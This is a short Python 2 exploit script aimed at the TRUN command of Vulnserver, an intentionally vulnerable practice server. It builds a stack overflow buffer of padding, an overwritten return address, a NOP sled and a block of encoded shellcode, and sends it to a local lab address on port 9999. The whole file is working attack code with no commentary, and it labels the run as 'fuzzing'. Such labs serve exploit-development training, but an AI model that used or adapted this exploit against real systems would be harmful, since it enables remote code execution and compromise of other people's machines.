#!/usr/bin/python

import socket
import sys

shellcode = (
"\xbb\xa5\x9d\x29\x16\xda\xc8\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x5d\x12\x83\xed\xfc\x03\xf8\x93\xcb\xe3\xfe\x44\x89"
"\x0c\xfe\x94\xee\x85\x1b\xa5\x2e\xf1\x68\x96\x9e\x71\x3c\x1b"
"\x54\xd7\xd4\xa8\x18\xf0\xdb\x19\x96\x26\xd2\x9a\x8b\x1b\x75"
"\x19\xd6\x4f\x55\x20\x19\x82\x94\x65\x44\x6f\xc4\x3e\x02\xc2"
"\xf8\x4b\x5e\xdf\x73\x07\x4e\x67\x60\xd0\x71\x46\x37\x6a\x28"
"\x48\xb6\xbf\x40\xc1\xa0\xdc\x6d\x9b\x5b\x16\x19\x1a\x8d\x66"
"\xe2\xb1\xf0\x46\x11\xcb\x35\x60\xca\xbe\x4f\x92\x77\xb9\x94"
"\xe8\xa3\x4c\x0e\x4a\x27\xf6\xea\x6a\xe4\x61\x79\x60\x41\xe5"
"\x25\x65\x54\x2a\x5e\x91\xdd\xcd\xb0\x13\xa5\xe9\x14\x7f\x7d"
"\x93\x0d\x25\xd0\xac\x4d\x86\x8d\x08\x06\x2b\xd9\x20\x45\x24"
"\x2e\x09\x75\xb4\x38\x1a\x06\x86\xe7\xb0\x80\xaa\x60\x1f\x57"
"\xcc\x5a\xe7\xc7\x33\x65\x18\xce\xf7\x31\x48\x78\xd1\x39\x03"
"\x78\xde\xef\x84\x28\x70\x40\x65\x98\x30\x30\x0d\xf2\xbe\x6f"
"\x2d\xfd\x14\x18\xc4\x04\xff\xe7\xb1\x3e\x95\x8f\xc3\x3e\x78"
"\x0c\x4d\xd8\x10\xbc\x1b\x73\x8d\x25\x06\x0f\x2c\xa9\x9c\x6a"
"\x6e\x21\x13\x8b\x21\xc2\x5e\x9f\xd6\x22\x15\xfd\x71\x3c\x83"
"\x69\x1d\xaf\x48\x69\x68\xcc\xc6\x3e\x3d\x22\x1f\xaa\xd3\x1d"
"\x89\xc8\x29\xfb\xf2\x48\xf6\x38\xfc\x51\x7b\x04\xda\x41\x45"
"\x85\x66\x35\x19\xd0\x30\xe3\xdf\x8a\xf2\x5d\xb6\x61\x5d\x09"
"\x4f\x4a\x5e\x4f\x50\x87\x28\xaf\xe1\x7e\x6d\xd0\xce\x16\x79"
"\xa9\x32\x87\x86\x60\xf7\xa7\x64\xa0\x02\x40\x31\x21\xaf\x0d"
"\xc2\x9c\xec\x2b\x41\x14\x8d\xcf\x59\x5d\x88\x94\xdd\x8e\xe0"
"\x85\x8b\xb0\x57\xa5\x99"
)

buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32  + shellcode

print "Fuzzing Vulnserver with %s bytes of data" % len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.1", 9999))
s.send("TRUN /.:/" + buffer)
s.close()
